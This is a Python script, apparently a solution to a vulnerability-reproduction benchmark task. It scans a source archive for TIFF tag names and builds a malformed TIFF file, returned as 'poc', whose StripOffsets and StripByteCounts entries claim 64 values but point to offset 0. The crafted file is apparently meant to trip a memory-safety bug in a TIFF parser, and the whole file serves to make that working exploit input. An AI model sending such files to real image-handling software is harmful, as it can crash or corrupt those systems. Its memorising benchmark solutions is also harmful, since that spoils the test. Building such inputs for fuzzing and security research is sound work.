import struct
import tarfile
import io
import os
import re

class Solution:
    def __init__(self):
        pass

    def _scan_source_for_tags(self, src_path: str):
        tags_present = set()
        names_present = set()
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    if not any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm")):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    if "STRIPOFFSETS" in text or "StripOffsets" in text:
                        names_present.add("STRIPOFFSETS")
                    if "STRIPBYTECOUNTS" in text or "StripByteCounts" in text:
                        names_present.add("STRIPBYTECOUNTS")
                    if "TILEOFFSETS" in text or "TileOffsets" in text:
                        names_present.add("TILEOFFSETS")
                    if "TILEBYTECOUNTS" in text or "TileByteCounts" in text:
                        names_present.add("TILEBYTECOUNTS")
                    for num in (273, 279, 324, 325):
                        if str(num) in text:
                            tags_present.add(num)
                    if len(tags_present) >= 4 and len(names_present) >= 4:
                        break
        except Exception:
            pass

        if 273 in tags_present or "STRIPOFFSETS" in names_present:
            off_tag = 273
        elif 324 in tags_present or "TILEOFFSETS" in names_present:
            off_tag = 324
        else:
            off_tag = 273

        if 279 in tags_present or "STRIPBYTECOUNTS" in names_present:
            bc_tag = 279
        elif 325 in tags_present or "TILEBYTECOUNTS" in names_present:
            bc_tag = 325
        else:
            bc_tag = 279

        return off_tag, bc_tag

    def _ifd_entry(self, tag: int, typ: int, count: int, value_field: bytes) -> bytes:
        return struct.pack("<HHI", tag, typ, count) + value_field

    def solve(self, src_path: str) -> bytes:
        off_tag, bc_tag = self._scan_source_for_tags(src_path)

        TYPE_SHORT = 3
        TYPE_LONG = 4

        def v_short(x: int) -> bytes:
            return struct.pack("<H", x & 0xFFFF) + b"\x00\x00"

        def v_long(x: int) -> bytes:
            return struct.pack("<I", x & 0xFFFFFFFF)

        strip_count = 64
        image_length = strip_count
        rows_per_strip = 1

        entries = []
        entries.append(self._ifd_entry(256, TYPE_LONG, 1, v_long(1)))                 # ImageWidth
        entries.append(self._ifd_entry(257, TYPE_LONG, 1, v_long(image_length)))     # ImageLength
        entries.append(self._ifd_entry(258, TYPE_SHORT, 1, v_short(8)))              # BitsPerSample
        entries.append(self._ifd_entry(259, TYPE_SHORT, 1, v_short(1)))              # Compression
        entries.append(self._ifd_entry(262, TYPE_SHORT, 1, v_short(1)))              # PhotometricInterpretation
        entries.append(self._ifd_entry(off_tag, TYPE_LONG, strip_count, v_long(0)))  # StripOffsets/TileOffsets (offset=0)
        entries.append(self._ifd_entry(277, TYPE_SHORT, 1, v_short(1)))              # SamplesPerPixel
        entries.append(self._ifd_entry(278, TYPE_LONG, 1, v_long(rows_per_strip)))   # RowsPerStrip
        entries.append(self._ifd_entry(bc_tag, TYPE_LONG, strip_count, v_long(0)))   # StripByteCounts/TileByteCounts (offset=0)
        entries.append(self._ifd_entry(284, TYPE_SHORT, 1, v_short(1)))              # PlanarConfiguration

        entries.sort(key=lambda e: struct.unpack("<H", e[0:2])[0])

        ifd = struct.pack("<H", len(entries)) + b"".join(entries) + struct.pack("<I", 0)

        header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
        poc = header + ifd
        return poc